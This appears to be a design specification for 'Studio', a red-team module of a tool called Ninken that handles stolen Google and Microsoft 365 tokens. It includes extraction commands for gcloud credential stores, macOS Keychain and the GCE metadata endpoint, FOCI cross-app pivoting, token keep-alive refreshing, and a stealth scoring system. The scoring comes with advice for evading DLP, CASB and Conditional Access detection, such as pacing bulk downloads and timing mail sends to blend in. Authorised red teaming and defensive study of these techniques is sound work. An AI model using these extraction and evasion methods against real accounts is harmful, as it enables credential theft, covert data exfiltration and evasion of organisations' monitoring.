**Studio is NOT a data browser** — it's an interactive knowledge base and token analysis toolkit that covers ALL platforms Ninken supports (Google, Microsoft, and future services). The red teamer uses Studio to understand what they have, what it can do, and how to get more — regardless of which platform the token belongs to.

##### Studio Views

**1. Token Analyzer** (multi-platform)
- Paste or upload any token from any supported platform
- Auto-detect platform AND token type:
  - **Google:** OAuth2 refresh token, OAuth2 access token, browser session cookies (SID/HSID/SSID/APISID/SAPISID), application default credentials (`~/.config/gcloud/application_default_credentials.json`), service account key JSON
  - **Microsoft:** OAuth2 refresh token, OAuth2 access token (JWT), PRT, PRT cookie, ESTSAUTH/ESTSAUTHPERSISTENT, FOCI token, Azure CLI cache, service principal secret
  - **Future:** GitHub PAT, GitLab PAT, Slack tokens, AWS access keys
- For JWTs: decode and display all claims (Google: `iss`, `aud`, `exp`, `scope`, `email`, `azp`; Microsoft: `iss`, `aud`, `exp`, `scp`/`roles`, `tid`, `oid`, `upn`, `amr`)
- Expiry countdown timer
- Scope/permission breakdown with human-readable descriptions (platform-aware)
- Stealth Score badge for the current token type
- Risk rating: what can this token access?
- FOCI detection (Microsoft): is this a FOCI-family token? Show cross-app pivot options
- "What can I do with this?" — maps token scopes to available API operations for that platform

**2. Service Map** (multi-platform)

Interactive reference of ALL services across ALL platforms, organized by platform tab.

**Google Workspace Services:**

| Service | Required Scopes | API Endpoint | What Red Teamers Find |
|---------|----------------|--------------|----------------------|
| Gmail | `gmail.readonly` / `gmail.modify` | Gmail API v1 `/users/me/messages` | Internal comms, credentials in emails, password reset links, 2FA backup codes, HR docs |
| Drive | `drive` / `drive.readonly` | Drive API v3 `/files` | Sensitive docs, credentials files, shared secrets, terraform state, HR records |
| GCP Buckets | `cloud-platform` / `devstorage.read_only` | Cloud Storage JSON API `/b/{bucket}/o` | Database backups, config files, secrets, terraform state, ML training data, CI/CD artifacts |
| Calendar | `calendar.readonly` / `calendar` | Calendar API v3 `/calendars/primary/events` | Meeting links (Zoom/Teams creds), internal contacts, org structure, travel schedules, 1:1 notes |
| Directory | `admin.directory.user.readonly` | Admin SDK Directory API `/users` | Full user enumeration, email harvest, org chart, 2FA status, admin roles |
| Groups | `admin.directory.group.readonly` | Admin SDK Directory API `/groups` | Security groups, mailing lists, external members, group-based access |
| GCP IAM | `cloud-platform` | Cloud Resource Manager API `/projects` | Project enumeration, IAM bindings, service account keys |
| Contacts | `contacts.readonly` | People API `/people/me/connections` | Personal contacts, external contacts, phone numbers |
| Chat | `chat.messages.readonly` | Google Chat API `/spaces/{space}/messages` | Internal chat messages, shared links, file attachments |
| Vault | `ediscovery.readonly` (admin) | Vault API `/matters` | Legal holds, eDiscovery exports, retained email/drive data |

**Microsoft 365 Services:**

| Service | Required Scopes | Graph Endpoint | What Red Teamers Find |
|---------|----------------|----------------|----------------------|
| Outlook | `Mail.Read` / `Mail.ReadWrite` | `/me/messages` | Internal comms, credentials in emails, password reset links |
| OneDrive | `Files.Read.All` | `/me/drive` | Sensitive docs, credentials files, backups |
| SharePoint | `Sites.Read.All` | `/sites` | Internal wikis, shared credentials, org charts |
| Teams | `Chat.Read` | `/me/chats` | Private messages, shared files, meeting links |
| Calendar | `Calendars.Read` | `/me/events` | Meeting links, internal contacts, org structure |
| Directory | `User.Read.All` | `/users` | Full user enumeration, email harvest, org chart |
| Groups | `Group.Read.All` | `/groups` | Security groups, distribution lists, access mapping |
| Roles | `RoleManagement.Read.All` | `/directoryRoles` | Admin accounts, privileged role assignments |
| Apps | `Application.Read.All` | `/applications` | App registrations, service principals, secrets |
| Intune | `DeviceManagementManagedDevices.Read.All` | `/deviceManagement/managedDevices` | Device inventory, compliance state |

Each service card expands to show: required scopes, example API calls, what data is typically valuable, stealth score for that service, and whether the current loaded token has access. Cards are grayed out if the current token lacks the required scopes.

**3. Extraction Guide** (multi-platform)

Interactive, filterable reference for token extraction techniques across ALL platforms.

- Filter by: **Platform** (Google / Microsoft / GitHub / AWS / etc.), **OS** (Windows / macOS / Linux), **Token Type** (Refresh / PRT / Cookie / Service Account / PAT / API Key), **Protection Level** (Plaintext / DPAPI / Keychain / TPM)
- Each entry shows: file path, token type, protection mechanism, extraction command/tool, prerequisites, OPSEC considerations, **stealth score of the resulting token**
- "What's available on this OS?" quick-filter mode
- Copy extraction commands to clipboard
- Decision tree: "I have X access level on Y OS → here are your extraction options"

**Google extraction sources (included alongside Microsoft):**

| Source | Token Type | OS | Protection | Extraction |
|--------|-----------|-----|------------|------------|
| `~/.config/gcloud/application_default_credentials.json` | OAuth2 refresh token | All | Plaintext JSON | Direct file read — `gcloud auth application-default login` output. Contains `client_id`, `client_secret`, `refresh_token` in cleartext. **Easiest Google extraction target** |
| `~/.config/gcloud/credentials.db` | OAuth2 refresh tokens (all gcloud accounts) | All | SQLite, plaintext | `sqlite3 credentials.db "SELECT * FROM credentials"` — contains all `gcloud auth login` accounts |
| `~/.config/gcloud/access_tokens.db` | OAuth2 access tokens (cached) | All | SQLite, plaintext | Short-lived but may contain valid tokens. Also reveals which scopes were requested |
| `~/.config/gcloud/properties` | Active account, project | All | Plaintext | Shows which account/project is active — useful for targeting |
| Browser cookies: `accounts.google.com` (SID, HSID, SSID, APISID, SAPISID) | Session cookies | All | DPAPI (Win), Keychain (macOS), Keyring (Linux) | Same browser cookie extraction as Microsoft. Required for browser-based Google access |
| `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb\` | Google OAuth tokens from web apps | Windows | Plaintext | Parse LevelDB for Google-issued tokens cached by web apps (Workspace, Cloud Console) |
| macOS Keychain: `accounts.google.com` | Google session tokens | macOS | Keychain ACL | `security find-internet-password -s "accounts.google.com"` |
| Service account key JSON files | Service account private key | All | Plaintext JSON (wherever stored) | Look for `*.json` files containing `"type": "service_account"`. These grant impersonation + API access without user interaction. Often found in: CI/CD configs, env vars, source code, GCS buckets, developer machines |
| `GOOGLE_APPLICATION_CREDENTIALS` env var | Points to service account key path | All | Environment variable | `echo $GOOGLE_APPLICATION_CREDENTIALS` — reveals where the key file lives |
| GCE metadata server (`169.254.169.254`) | OAuth2 access token (VM identity) | GCE VMs | Network-accessible (no auth) | `curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` — instant access token from any process on the VM |

**Tools for Google extraction:**
- `gcloud` CLI (if installed — `gcloud auth print-access-token`)
- Browser cookie extractors (SharpChromium, HackBrowserData)
- Manual file reads for gcloud config directory
- GCE metadata API (no tools needed, just curl)

**4. Token Converter** (multi-platform)
- Input: any supported token type from any platform
- Output: API-ready access token for that platform
- Shows the exchange chain visually:
  - **Microsoft:** PRT → RT → AT, FOCI → AT, Cookie → AT, Azure CLI → AT
  - **Google:** Refresh Token → AT, Service Account Key → AT, GCE Metadata → AT, gcloud credentials.db → AT
- FOCI pivot panel (Microsoft): "You have a Teams token → here are all the apps you can access"
- Auto-try all FOCI client IDs and report which ones succeed
- Service account impersonation (Google): "You have a SA key → here are the users you can impersonate via domain-wide delegation"
- Token refresh scheduler: keep tokens alive by auto-refreshing before expiry (both platforms)

**5. OPSEC Stealth Score**

Every token type and access method in Ninken gets a **Stealth Score badge** — a visual rating that tells the red teamer how noisy or quiet their current approach is. Displayed everywhere: on the loaded token in the header, on each service card, in the extraction guide, and in the token converter output.

**Score scale (5 levels):**

| Badge | Label | Color | Meaning |
|-------|-------|-------|---------|
| 5/5 | Ghost | green-500 | Pure API, no browser interaction, no fingerprint surface, minimal logging |
| 4/5 | Silent | emerald-400 | API-side with minor OPSEC considerations (e.g., unusual user-agent, rate limits) |
| 3/5 | Cautious | yellow-500 | Mixed — requires one browser-side step (cookie conversion) then API, or uses a well-monitored scope |
| 2/5 | Visible | orange-500 | Browser-heavy, leaves artifacts, triggers some detections (Conditional Access, sign-in logs with device info) |
| 1/5 | Loud | red-500 | High detection risk — direct browser SSO, triggers MFA prompts, Conditional Access evaluations, anomaly detections |

**Stealth scores per token type (Microsoft):**

| Token Type | Access Method | Stealth Score | Why |
|-----------|--------------|---------------|-----|
| **Refresh Token → Graph API** | API only | **5/5 Ghost** | No browser. Token exchange is server-to-server. Graph API calls have no fingerprint surface. No Conditional Access evaluation (unless tenant scopes CA to "All cloud apps"). Minimal sign-in log entry (non-interactive) |
| **FOCI Refresh Token → Graph API** | API only | **5/5 Ghost** | Same as above. Cross-app exchange is invisible to the user. Sign-in log shows the target app client_id but no interactive sign-in |
| **Azure CLI cache → Graph API** | API only | **5/5 Ghost** | Plaintext token, direct exchange, same stealth as any refresh token |
| **PRT (extracted, non-TPM) → RT → Graph API** | API only (after initial extraction) | **4/5 Silent** | Graph access is clean, but the PRT → RT derivation may log a "PRT usage" event in Entra ID sign-in logs. Also: extracting the PRT requires SYSTEM or DPAPI access on the host |
| **PRT Cookie → browser SSO → Graph API** | One browser hop, then API | **3/5 Cautious** | The cookie injection triggers a browser SSO at login.microsoftonline.com — this creates a sign-in log entry with browser user-agent, IP, and may trigger Conditional Access. After the access token is captured, it's API-clean |
| **ESTSAUTHPERSISTENT → silent auth → Graph API** | One browser hop, then API | **3/5 Cautious** | Same as PRT cookie — the silent auth at login.microsoftonline.com is one browser interaction that may trigger CA / risk detection. After that, Graph is clean |
| **ESTSAUTH → silent auth → Graph API** | One browser hop, then API | **2/5 Visible** | Short-lived cookie (24h), more likely to trigger "new session" detections. Same browser exposure as above but with a tighter window and more sign-in log noise |
| **Direct browser access (Outlook Web, SharePoint, etc.)** | Full browser | **1/5 Loud** | Full browser fingerprint surface. Canvas, WebGL, behavioral ML, Conditional Access device checks, CAPTCHA, impossible travel detection. This is what Ninken exists to avoid |

**Stealth scores per token type (Google):**

| Token Type | Access Method | Stealth Score | Why |
|-----------|--------------|---------------|-----|
| **Refresh Token → Google APIs** | API only | **5/5 Ghost** | Pure API, no browser. Token exchange is server-to-server via `oauth2.googleapis.com/token`. Google logs the API call in Admin Audit Log but there's no fingerprint surface, no device check, no behavioral ML. This is Ninken's default Google path |
| **OAuth Access Token → Google APIs** | API only | **5/5 Ghost** | Direct API use, short-lived (1h) but fully clean. No exchange step needed. Same stealth as refresh token once you have it |
| **Service Account Key → Google APIs** | API only | **5/5 Ghost** | JWT signed locally, exchanged for access token server-to-server. No user involvement, no browser. Admin Audit Log shows service account identity, not a user. Often less monitored than user tokens |
| **Service Account + Domain-Wide Delegation** | API only (impersonation) | **4/5 Silent** | Pure API but impersonates a user — the Admin Audit Log shows the impersonated user's email with a `delegatedAdmin` flag. Security-mature orgs monitor DWD usage. Still no browser surface |
| **gcloud application_default_credentials.json** | API only (via refresh token) | **5/5 Ghost** | Contains a standard refresh token — same flow as manual refresh token. Source of extraction doesn't affect stealth of usage |
| **gcloud credentials.db** | API only (via refresh token) | **5/5 Ghost** | Same as above — it's just a different storage location for the same refresh token |
| **GCE Metadata server token** | API only | **4/5 Silent** | Access token is scoped to the VM's service account. Clean API usage but: (a) token audience may be restricted, (b) access is logged under the VM's SA identity, (c) calling metadata server from within the VM is not logged but unusual API patterns from that SA might be flagged |
| **Browser session cookies (SID/HSID/SSID)** | Browser | **1/5 Loud** | Full browser surface. Google's Advanced Protection, device fingerprinting, behavioral ML, impossible travel detection, CAPTCHA challenges, risk-based re-authentication. This is what Ninken exists to avoid |
| **Browser cookies → API conversion** | One browser hop, then API | **2/5 Visible** | Requires navigating to `accounts.google.com/o/oauth2/v2/auth` with the session cookie to obtain an access token. This browser interaction triggers Google's full detection stack for that one request. After capturing the access token, subsequent API calls are clean — but Google's initial detection may already flag the session |

**Service-level stealth modifiers (Google):**

| Service | Modifier | Reason |
|---------|----------|--------|
| Gmail (read) | +0 | Standard API access, logged in Admin Audit but low signal |
| Gmail (send) | -1 | Sending triggers content scanning, DLP rules, and shows in sent folder. External recipients increase risk |
| Gmail (modify/delete) | -1 | Destructive actions on mailbox are more likely to be noticed by the user or trigger alerts |
| Drive (read/list) | +0 | Standard file browsing, low signal |
| Drive (bulk download) | -1 | High-volume download triggers DLP alerts, Google Workspace alerts for "large data export" |
| Drive (share externally) | -1 | External sharing triggers DLP and admin alerts in most orgs |
| GCP Buckets (read) | +0 | Standard access, logged in Cloud Audit Logs |
| GCP Buckets (bulk download) | -1 | Same as Drive — volume triggers alerts |
| Calendar (read) | +0 | Low signal, standard access |
| Directory (list users) | +0 | Common admin API call |
| Directory (list roles/2FA status) | -1 | Security enumeration pattern — stands out in Admin Audit Logs in mature orgs |
| Admin SDK (write operations) | -2 | Creating users, modifying groups, changing roles — highly monitored, often triggers instant alerts |
| GCP IAM (read bindings) | -1 | IAM enumeration is a known recon pattern, logged in Cloud Audit Logs |
| Service Account impersonation (DWD) | -1 | DWD usage is logged with `delegatedAdmin` flag and monitored by security-aware orgs |

**Where stealth badges appear in the UI:**

1. **Token header widget** — next to the loaded token info, shows the current stealth score for the active access method
2. **Service Map cards** — each service shows the stealth score for the current token's access to that specific service (some services are more monitored than others)
3. **Token Converter** — when converting between token types, shows the stealth score of the input vs output method, with a visual arrow showing improvement/degradation
4. **Extraction Guide** — each extraction technique shows the stealth score of what you'd get if you used that token via Ninken's API path
5. **Token Analyzer** — after analyzing a pasted token, shows the stealth score and recommendations ("You're at 3/5 — convert this browser cookie to a refresh token to reach 5/5")

**Service-level stealth modifiers (Microsoft):**

Some Graph API scopes/services are more monitored than others, regardless of token type. The stealth score adjusts per service:

| Service | Modifier | Reason |
|---------|----------|--------|
| Mail (read) | +0 | Standard access, low monitoring unless DLP rules exist |
| Mail (send) | -1 | Send actions are more likely to trigger alerts (especially to external recipients) |
| Directory (read users) | +0 | Common API call, low signal |
| Directory (read roles) | -1 | Admin role enumeration can trigger alerts in security-mature tenants |
| OneDrive (read) | +0 | Standard file access |
| OneDrive (bulk download) | -1 | High-volume download triggers DLP / CASB alerts |
| SharePoint | +0 | Standard access |
| Teams (read messages) | +0 | Low monitoring on read |
| Intune (read devices) | -1 | Device management API access is unusual for most users, stands out in logs |
| Application registrations | -1 | App enumeration is a known attack reconnaissance pattern |

**Final displayed score** = base token stealth score + service modifier (clamped to 1-5 range)

**OPSEC recommendations engine:**
Studio provides contextual, platform-aware recommendations based on the current stealth score:

Microsoft examples:
- "Your current approach is 3/5 Cautious. To reach Ghost (5/5): extract a refresh token from the Token Broker cache instead of using the browser session cookie."
- "Sending mail drops your stealth to 4/5 Silent. Consider: using a less monitored FOCI client_id, avoiding external recipients, or timing sends during business hours to blend with normal activity."
- "Bulk downloading from OneDrive drops stealth to 4/5. Recommendation: spread downloads over time, use pagination, stay under CASB thresholds."

Google examples:
- "Your refresh token via Google APIs is 5/5 Ghost. Maintaining this — avoid bulk Drive downloads (triggers DLP) and external Gmail sends (triggers content scanning)."
- "Using Domain-Wide Delegation drops stealth to 4/5 Silent. DWD access is logged with a delegatedAdmin flag. Consider: limiting impersonation to a small set of users, avoiding admin accounts."
- "You're accessing Admin SDK directory endpoints — this drops to 4/5 Silent. Role and 2FA enumeration is a known recon pattern. Recommendation: cache results locally and avoid repeated enumeration calls."
- "Sending Gmail as the user drops stealth to 4/5. The sent message appears in their Sent folder. Consider: drafting without sending if you only need proof of access, or sending to an internal address to avoid external DLP triggers."

**6. Scope Calculator** (multi-platform)
- Platform selector: Google / Microsoft (future: GitHub, AWS, etc.)
- Interactive tool: select what you want to access (email, files, directory, etc.)
- Shows: minimum required scopes for that platform, which token types can provide them, extraction paths to get those tokens, stealth score for each path
- Reverse mode: paste a token → auto-detect platform → show all services it can access on that platform
- Gap analysis: "You have X access but are missing Y scopes for full enumeration"
- Cross-platform view: if both Google and Microsoft tokens are loaded, show a unified matrix of what you can access across both tenants
- **Google scopes reference:** `gmail.readonly`, `gmail.modify`, `drive`, `drive.readonly`, `calendar`, `admin.directory.user.readonly`, `cloud-platform`, etc.
- **Microsoft scopes reference:** `Mail.Read`, `Files.ReadWrite.All`, `User.Read.All`, `Directory.Read.All`, `Chat.Read`, etc.
- Side-by-side comparison: Google scope ↔ Microsoft scope equivalents (e.g., `gmail.readonly` ≈ `Mail.Read`)

##### Studio Components

```
src/app/(app)/studio/
  page.tsx                         # Studio landing — token analyzer (primary view)
  services/page.tsx                # Service map
  extraction/page.tsx              # Extraction guide
  converter/page.tsx               # Token converter
  stealth/page.tsx                 # OPSEC stealth score dashboard
  scopes/page.tsx                  # Scope calculator

src/components/studio/
  token-analyzer.tsx               # JWT decoder, type detection, scope display
  token-claims-table.tsx           # Claims breakdown table
  service-map.tsx                  # Interactive service grid
  service-card.tsx                 # Expandable service detail
  extraction-guide.tsx             # Filterable extraction reference
  extraction-card.tsx              # Individual extraction technique
  extraction-decision-tree.tsx     # "I have X → here are your options"
  token-converter.tsx              # Token exchange UI
  foci-pivot-panel.tsx             # FOCI cross-app analysis
  stealth-badge.tsx                # Reusable stealth score badge (1-5, color-coded)
  stealth-score-card.tsx           # Token type + service stealth breakdown
  stealth-recommendations.tsx      # OPSEC recommendations engine
  stealth-comparison.tsx           # Side-by-side stealth comparison (current vs alternative approach)
  scope-calculator.tsx             # Interactive scope planner
  scope-gap-analysis.tsx           # What you have vs what you need
```

##### Studio Sidebar Nav

```typescript
const studioNavItems = [
  { title: "Analyzer",   href: "/studio",            icon: Search },
  { title: "Services",   href: "/studio/services",   icon: Grid },
  { title: "Extraction", href: "/studio/extraction",  icon: Download },
  { title: "Converter",  href: "/studio/converter",   icon: ArrowRightLeft },
  { title: "Stealth",    href: "/studio/stealth",     icon: Eye },
  { title: "Scopes",     href: "/studio/scopes",      icon: Shield },
]
```

##### Studio Data Architecture

Studio content is **static reference data** (not API-dependent) bundled at build time, plus **dynamic analysis** when a token is loaded:

```
src/lib/studio/
  token-types.ts                   # Token type definitions, detection regex
  microsoft-services.ts            # Graph API service catalog
  google-services.ts               # Google API service catalog
  extraction-database.ts           # Extraction techniques per OS/token type
  foci-clients.ts                  # FOCI family client IDs
  scope-definitions.ts             # Scope → human description mapping
  jwt-decoder.ts                   # JWT parsing without external deps
  stealth-scores.ts                # Base stealth scores per token type + access method
  stealth-modifiers.ts             # Per-service stealth modifiers and OPSEC rules
  stealth-recommendations.ts       # Recommendation engine: current score → improvement suggestions
```

The static data makes Studio useful even without a loaded token — it's a reference tool the red teamer can consult during planning. When a token IS loaded, the dynamic features (analyzer, converter, gap analysis) light up.

### Microsoft 365 — Credential Auto-Detection Updates

Update the credential detection table to handle all M365 token types:

| Pattern | Token Type | Action |
|---------|-----------|--------|
| JSON with `refresh_token` + `tenant_id` or `client_id` matching UUID format | M365 OAuth2 Refresh Token | Route to Microsoft module, exchange for Graph access |
| JWT where `iss` contains `sts.windows.net` or `login.microsoftonline.com` | M365 Access Token (JWT) | Decode, check expiry, warn if <10min remaining, use directly with Graph |
| JSON with `prt` + `session_key` fields | M365 PRT (extracted) | Route to PRT exchange flow |
| String matching `x-ms-RefreshTokenCredential` cookie format | M365 PRT Cookie | Route to browser SSO exchange flow |
| JSON with `estsauthpersistent` field | M365 Browser Session | Route to silent auth flow |
| Refresh token + `client_id` matching known FOCI app | M365 FOCI Token | Enable FOCI pivot panel, try cross-app exchanges |
| JSON from `~/.azure/msal_token_cache.json` format (contains `AccessToken`, `RefreshToken`, `IdToken` keys) | Azure CLI MSAL Cache | Parse all accounts, let user pick which to load |

### Font Preferences
- Default font stack: Geist Sans with `ui-sans-serif, system-ui, sans-serif` fallback
- No serif fonts anywhere in the UI (user preference: no Times New Roman-style fonts)
